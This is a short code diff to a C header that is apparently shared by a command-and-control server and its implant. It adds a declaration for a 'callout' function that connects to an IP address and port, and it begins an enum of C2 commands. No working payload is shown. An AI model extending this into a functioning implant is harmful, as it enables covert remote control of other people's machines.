@@ -1,6 +1,9 @@
-// Define common structs across C2 and implant
+// Define common structs and functions across C2 and implant
 
 #include <stdint.h>
+
+
+int callout(uint16_t port, const char* ip_address, int* client_fd);
 
 // All possible commands we could get from our C2
 typedef enum Commands
